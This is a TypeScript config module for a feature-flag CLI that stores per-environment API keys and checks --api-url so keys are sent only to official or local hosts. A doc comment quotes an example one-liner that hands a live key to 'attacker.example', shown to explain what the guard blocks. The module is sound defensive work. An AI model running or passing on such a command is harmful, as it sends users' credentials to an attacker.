import { chmodSync, existsSync, readFileSync, writeFileSync } from 'node:fs';
import { dirname, join, resolve } from 'node:path';

export const CONFIG_FILE = '.flagrship.json';
export const DEFAULT_API_URL = 'https://api.flagrship.dev';

/** Hosts the CLI will send an API key to without being told twice. */
const OFFICIAL_HOST = 'flagrship.dev';
const LOOPBACK = new Set(['localhost', '127.0.0.1', '[::1]', '::1']);

const isLoopback = (host: string) => LOOPBACK.has(host) || host.endsWith('.localhost');
const isOfficial = (host: string) => host === OFFICIAL_HOST || host.endsWith(`.${OFFICIAL_HOST}`);

/**
 * Guards the one command that hands an API key to a hostname of someone else's
 * choosing. `flagrship init --key sk_live_… --api-url https://attacker.example`
 * is a working credential-exfiltration one-liner if nothing checks it, and it is
 * the kind of thing that gets pasted into a terminal from a README or a chat.
 *
 * Runs *before* the key is sent anywhere, because a warning printed afterwards
 * is just a receipt.
 */
export function assertSafeApiUrl(apiUrl: string, allowCustomHost = false): void {
  let url: URL;
  try {
    url = new URL(apiUrl);
  } catch {
    throw new CliError(`--api-url is not a valid URL: ${apiUrl}`);
  }

  if (url.protocol !== 'https:' && url.protocol !== 'http:') {
    throw new CliError(`--api-url must be http or https, got "${url.protocol}".`);
  }

  if (url.protocol === 'http:' && !isLoopback(url.hostname)) {
    throw new CliError(
      `Refusing to send an API key over plain http to ${url.host}. Use https, ` +
        `or a local address if you are running the API yourself.`,
    );
  }

  if (!isOfficial(url.hostname) && !isLoopback(url.hostname) && !allowCustomHost) {
    throw new CliError(
      `Refusing to send your API key to ${url.host}, which is not a Flagrship host.\n` +
        `  If you are self-hosting the API and meant to do this, re-run with --allow-custom-host.\n` +
        `  If someone gave you this command, do not run it - it would hand them your key.`,
    );
  }
}

/**
 * One key per environment. An API key is scoped to exactly one environment on
 * the server, so `--env staging` means "use the staging key", not a query
 * parameter. This file holds secrets - `init` adds it to .gitignore.
 */
export interface Config {
  apiUrl: string;
  defaultEnvironment: string;
  keys: Record<string, string>;
}

/** Walks up from cwd, like git does for .git - so the CLI works from any subdirectory. */
export function findConfigPath(from = process.cwd()): string | null {
  let dir = resolve(from);
  for (;;) {
    const candidate = join(dir, CONFIG_FILE);
    if (existsSync(candidate)) return candidate;
    const parent = dirname(dir);
    if (parent === dir) return null;
    dir = parent;
  }
}

export function loadConfig(): { path: string; config: Config } {
  const path = findConfigPath();
  if (!path) {
    throw new CliError(
      `No ${CONFIG_FILE} found in this directory or any parent. Run: flagrship init --key <api-key>`,
    );
  }

  let config: Config;
  try {
    config = JSON.parse(readFileSync(path, 'utf8'));
  } catch (err) {
    throw new CliError(`${path} is not valid JSON: ${(err as Error).message}`);
  }

  if (!config.keys || typeof config.keys !== 'object') {
    throw new CliError(`${path} has no "keys" section. Run: flagrship init --key <api-key>`);
  }
  return { path, config };
}

/**
 * Owner-read/write only. `mode` applies on create; an existing file keeps the
 * permissions it already had, so chmod as well. Both are no-ops on Windows,
 * where the file inherits the directory's ACL - documented, not silently
 * assumed.
 */
export function saveConfig(path: string, config: Config): void {
  writeFileSync(path, JSON.stringify(config, null, 2) + '\n', { mode: 0o600 });
  try {
    chmodSync(path, 0o600);
  } catch {
    // Windows and some network filesystems do not implement it. The write
    // succeeded, which is the part that matters.
  }
}

/** Picks the key for `--env`, or the default environment when none was given. */
export function resolveKey(config: Config, env?: string): { env: string; key: string } {
  const target = env ?? config.defaultEnvironment;
  const key = config.keys[target];
  if (!key) {
    const known = Object.keys(config.keys).sort();
    throw new CliError(
      `No API key for environment "${target}". ` +
        (known.length
          ? `Known environments: ${known.join(', ')}. Add one with: flagrship init --key <key>`
          : `Run: flagrship init --key <api-key>`),
    );
  }
  return { env: target, key };
}

/** Appends the config file to .gitignore next to it, once. Never commit a key by accident. */
export function ensureGitignored(configPath: string): boolean {
  const gitignore = join(dirname(configPath), '.gitignore');
  const existing = existsSync(gitignore) ? readFileSync(gitignore, 'utf8') : '';
  if (existing.split(/\r?\n/).some((line) => line.trim() === CONFIG_FILE)) return false;

  const prefix = existing.length && !existing.endsWith('\n') ? '\n' : '';
  writeFileSync(gitignore, `${existing}${prefix}${CONFIG_FILE}\n`);
  return true;
}

/** An error the user can act on. Printed without a stack trace; exits 1. */
export class CliError extends Error {
  constructor(message: string) {
    super(message);
    this.name = 'CliError';
  }
}
